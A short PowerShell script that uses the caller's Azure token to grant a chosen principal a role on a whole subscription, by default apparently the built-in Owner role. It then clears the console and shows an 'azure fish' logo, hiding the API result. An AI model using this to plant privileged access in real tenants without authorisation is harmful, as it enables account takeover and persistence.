[CmdletBinding()]
param (
    [Parameter()]
    [string]$subscriptionId,
    
    [Parameter()]
    [string]$principalId,

    [Parameter()]
    [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
)

$logo = "
                                                          _|_|  _|            _|        
  _|_|_|  _|_|_|_|  _|    _|  _|  _|_|    _|_|          _|            _|_|_|  _|_|_|    
_|    _|      _|    _|    _|  _|_|      _|_|_|_|      _|_|_|_|  _|  _|_|      _|    _|  
_|    _|    _|      _|    _|  _|        _|              _|      _|      _|_|  _|    _|  
  _|_|_|  _|_|_|_|    _|_|_|  _|          _|_|_|        _|      _|  _|_|_|    _|    _|"
                                                                                                                
$token = (Get-AzAccessToken).token
$headers = @{"Authorization"="Bearer $token"}
$guid = (New-Guid).Guid

$payload = @{
    properties = @{
        roleDefinitionId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/$roleDefinition"
        principalId      = $principalId
        principalType    = "user"
    }
} | ConvertTo-Json -Depth 10 -Compress

$uri = "https://management.azure.com/subscriptions/$($subscriptionId)/providers/Microsoft.Authorization/roleAssignments/$($guid)?api-version=2022-04-01"

$result = Invoke-RestMethod `
    -uri $uri `
    -Body $payload `
    -ContentType 'application/json' `
    -Method 'PUT' `
    -headers $headers

Clear-Host
Write-Host $logo -ForegroundColor Blue
